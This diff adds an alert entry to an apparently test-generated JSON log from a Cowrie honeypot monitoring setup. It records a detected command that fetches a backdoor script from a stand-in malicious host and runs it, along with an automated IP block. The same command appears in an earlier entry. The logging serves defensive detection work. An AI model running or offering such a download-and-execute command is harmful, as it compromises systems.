@@ -3290,5 +3290,34 @@
       "command": "wget http://malicious.example/backdoor.sh && bash backdoor.sh",
       "session": "react-ui-test-8b775e60"
     }
+  },
+  {
+    "alert_id": "ALERT-2026-09-18T11:32:46.840371Z-2812",
+    "timestamp": "2026-09-18T11:32:46.840371Z",
+    "severity": "HIGH",
+    "threat_type": "MALICIOUS_COMMAND",
+    "source_ip": "203.0.113.76",
+    "description": "Malicious command detected: wget http://malicious.example/backdoor.sh && bash backdoor.sh",
+    "recommended_action": "Block IP and investigate",
+    "response_actions": [
+      {
+        "action_id": "cowrie-block-203.0.113.76",
+        "timestamp": "2026-09-18T11:32:46.858980",
+        "action_type": "BLOCK_IP_COWRIE",
+        "target": "203.0.113.76",
+        "severity": "HIGH",
+        "reason": "Malicious command: wget http://malicious.example/backdoor.sh && bash ",
+        "status": "success",
+        "details": {
+          "status": "success",
+          "ip": "203.0.113.76"
+        }
+      }
+    ],
+    "attack_details": {
+      "eventid": "cowrie.command.input",
+      "command": "wget http://malicious.example/backdoor.sh && bash backdoor.sh",
+      "session": "react-ui-test-3d4a8564"
+    }
   }
 ]
